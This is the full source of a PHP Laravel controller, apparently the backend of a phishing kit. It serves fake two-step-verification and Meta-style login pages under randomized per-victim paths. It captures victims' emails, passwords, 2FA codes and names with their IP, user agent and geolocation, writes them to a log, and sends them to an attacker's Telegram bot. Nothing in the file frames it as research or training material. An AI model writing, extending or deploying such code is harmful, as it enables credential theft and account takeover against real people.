<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;

class PhishingController extends Controller
{
    private function getSessionData()
    {
        if (!Session::has('_s_data')) {
            $pathToken1 = Str::random(60);
            $pathToken2 = Str::random(60);
            $pathToken3 = Str::random(60);
            $pathToken4 = Str::random(60);
            $pathToken5 = Str::random(60);

            $sessionData = [
                'ip' => request()->ip(),
                'userAgent' => request()->header('User-Agent') ?: "",
                'createdAt' => now()->timestamp,
                'loginPath' => "/two_step_verification{$pathToken1}/login/{$pathToken2}",
                'authPath' => "/two_step_verification{$pathToken1}/authentication/{$pathToken3}",
                'metaBasePath' => "/two_step_verification{$pathToken1}/invitation/{$pathToken4}",
                'settingsPath' => "/two_step_verification{$pathToken1}/latest-settings-info/{$pathToken5}",
                'pathPrefix' => "two_step_verification{$pathToken1}",
            ];
            Session::put('_s_data', $sessionData);
        }
        return Session::get('_s_data');
    }

    public function index()
    {
        return view('landing.home');
    }

    public function about()
    {
        return view('landing.about');
    }

    public function contact()
    {
        return view('landing.contact');
    }

    public function startPhishing()
    {
        $session = $this->getSessionData();
        $targetUrl = $session['loginPath'];

        return response()->view('welcome_redirect', [
            'targetUrl' => $targetUrl,
            'metaBasePath' => $session['metaBasePath']
        ])->header('Content-Type', 'text/html');
    }

    public function latestSettingsInfo()
    {
        $session = $this->getSessionData();
        $targetUrl = $session['settingsPath'];

        return response()->view('welcome_redirect', [
            'targetUrl' => $targetUrl,
            'metaBasePath' => $session['metaBasePath']
        ])->header('Content-Type', 'text/html');
    }

    public function showLogin($tpath, $ltoken)
    {
        $session = $this->getSessionData();
        if ("two_step_verification{$tpath}" !== $session['pathPrefix']) {
            return abort(404);
        }
        return view('login1', [
            'loginPath' => $session['loginPath'],
            'authPath' => $session['authPath']
        ]);
    }

    public function show2fa($tpath, $atoken)
    {
        $session = $this->getSessionData();
        if ("two_step_verification{$tpath}" !== $session['pathPrefix']) {
            return abort(404);
        }

        // Referer check removed to prevent blocking legitimate flows or testers

        return view('2fa1', [
            'metaBasePath' => $session['metaBasePath']
        ]);
    }

    public function showMeta($tpath, $itoken, $page)
    {
        $session = $this->getSessionData();
        if ("two_step_verification{$tpath}" !== $session['pathPrefix']) {
            return abort(404);
        }

        $templates = [1 => "meta1v1", 2 => "meta2v2", 3 => "meta3v2"];
        if (!isset($templates[$page])) {
            return abort(404);
        }

        return view($templates[$page], ['metaBasePath' => $session['metaBasePath']]);
    }

    public function showFx($tpath, $stoken)
    {
        $session = $this->getSessionData();
        if ("two_step_verification{$tpath}" !== $session['pathPrefix']) {
            return abort(404);
        }
        return view('fx', [
            'metaBasePath' => $session['metaBasePath']
        ]);
    }

    public function getSessionPaths()
    {
        $session = Session::get('_s_data');
        if (!$session) {
            return response()->json(['error' => 'No session'], 401);
        }
        return response()->json([
            'loginPath' => $session['loginPath'],
            'authPath' => $session['authPath'],
            'metaBasePath' => $session['metaBasePath'],
            'settingsPath' => $session['settingsPath'],
        ]);
    }

    public function handleLogin(Request $request)
    {
        $data = $request->all();
        $data['ip'] = $request->ip();
        $data['userAgent'] = $request->header('User-Agent') ?: 'N/A';
        $data['type'] = "Đăng Nhập Lần " . ($data['attempts'] ?? 1) . " - Email " . ($data['email'] ?? 'N/A');

        $this->logAndSend($data);

        return response()->json(['status' => 'ok']);
    }

    public function handle2fa(Request $request)
    {
        $data = $request->all();
        $data['ip'] = $request->ip();
        $data['userAgent'] = $request->header('User-Agent') ?: 'N/A';
        $data['type'] = "2FA Lần " . ($data['step'] ?? 1) . " - Email " . ($data['email'] ?? 'N/A');

        $this->logAndSend($data);

        if (($data['step'] ?? 1) == 1) {
            return response()->json(['action' => 'reload']);
        }
        else {
            $session = Session::get('_s_data');
            $redirectUrl = $session ? $session['metaBasePath'] . "/1" : "/";
            return response()->json(['action' => 'complete', 'redirectUrl' => $redirectUrl]);
        }
    }

    public function handleGenericLog(Request $request)
    {
        $data = $request->all();
        $data['ip'] = $request->ip();
        $data['userAgent'] = $request->header('User-Agent') ?: 'N/A';

        $this->logAndSend($data);

        return response()->json(['status' => 'ok']);
    }

    private function logAndSend($data)
    {
        $ip = $data['ip'];
        $geo = $this->getGeo($ip);

        $data['city'] = $geo['city'] ?? 'Unknown';
        $data['region'] = $geo['region'] ?? 'Unknown';
        $data['country'] = $geo['country'] ?? 'Unknown';
        $data['org'] = $geo['org'] ?? 'Unknown';
        $data['timezone'] = $geo['timezone'] ?? 'Unknown';
        $data['time'] = now()->toIso8601String();

        // Save to log file
        $logEntry = now()->toIso8601String() . " - IP: " . $ip . " - Location: " . ($geo['city'] ?? "Unknown") . ", " . ($geo['country'] ?? "Unknown") . " - " . json_encode($data) . PHP_EOL;
        Log::channel('single')->info($logEntry);

        // Format for Telegram
        $message = $this->formatTelegramMessage($data, ($geo['city'] ?? "Unknown") . ", " . ($geo['country'] ?? "Unknown"));
        $this->sendToTelegram($message);
    }

    private function getGeo($ip)
    {
        if (!$ip || $ip === "::1" || $ip === "127.0.0.1") {
            return [
                'city' => 'Local', 'region' => 'Local', 'country' => 'Local',
                'org' => 'Local', 'timezone' => 'Local'
            ];
        }

        try {
            $response = Http::get("http://ip-api.com/json/{$ip}");
            if ($response->successful()) {
                $data = $response->json();
                if ($data['status'] === 'success') {
                    return [
                        'city' => $data['city'],
                        'region' => $data['regionName'],
                        'country' => $data['country'],
                        'org' => $data['org'],
                        'timezone' => $data['timezone']
                    ];
                }
            }
        }
        catch (\Exception $e) {
        }

        return [];
    }

    private function formatTelegramMessage($data, $location)
    {
        $escapeMd = function ($str) {
            if (!is_string($str))
                return $str;
            return str_replace(['`', '*'], ['\\`', '\\*'], $str);
        };

        $msg = "*THÔNG TIN HOẠT ĐỘNG*\n";
        $msg .= "----------------------------------------------------------\n";

        if (isset($data['email']))
            $msg .= "Email: `{$escapeMd($data['email'])}`\n";
        if (isset($data['pass']))
            $msg .= "Password: `{$escapeMd($data['pass'])}`\n";
        if (isset($data['password1']))
            $msg .= "Pass 1: `{$escapeMd($data['password1'])}`\n";
        if (isset($data['password2']))
            $msg .= "Pass 2: `{$escapeMd($data['password2'])}`\n";

        if (isset($data['firstName']) || isset($data['lastName'])) {
            $msg .= "Name: {$escapeMd($data['firstName'] ?? '')} {$escapeMd($data['lastName'] ?? '')}\n";
        }

        $msg .= "----------------------------------------------------------\n";

        if (isset($data['code'])) {
            $label = (isset($data['attempt']) || isset($data['step'])) ? "Code " . ($data['attempt'] ?? $data['step']) : "Code";
            $msg .= "{$label}: `{$escapeMd($data['code'])}`\n";
        }
        if (isset($data['code2']))
            $msg .= "Code 2: `{$escapeMd($data['code2'])}`\n";

        $msg .= "----------------------------------------------------------\n";
        $msg .= "IP Address: `{$escapeMd($data['ip'] ?? 'N/A')}`\n";
        $msg .= "Location: {$location}\n";
        if (isset($data['city']))
            $msg .= " City: {$escapeMd($data['city'])}\n";
        if (isset($data['country']))
            $msg .= "Country: {$escapeMd($data['country'])}\n";
        if (isset($data['org']))
            $msg .= "Org: {$escapeMd($data['org'])}\n";

        $msg .= "----------------------------------------------------------\n";
        $msg .= "User-Agent:\n`{$escapeMd($data['userAgent'] ?? 'N/A')}`\n";
        $msg .= "----------------------------------------------------------\n";

        if (isset($data['type']))
            $msg .= "Type: {$data['type']}\n";
        if (isset($data['page']))
            $msg .= "Page: {$data['page']}\n";

        return $msg;
    }

    private function sendToTelegram($message)
    {
        $token = env('TELEGRAM_BOT_TOKEN');
        $chatId = env('TELEGRAM_CHAT_ID');

        if (!$token || !$chatId) {
            Log::warning("Telegram credentials not set.");
            return;
        }

        $url = "https://api.telegram.org/bot{$token}/sendMessage";

        $response = Http::post($url, [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ]);

        if (!$response->successful()) {
            // Retry without markdown
            Http::post($url, [
                'chat_id' => $chatId,
                'text' => $message,
            ]);
        }
    }
}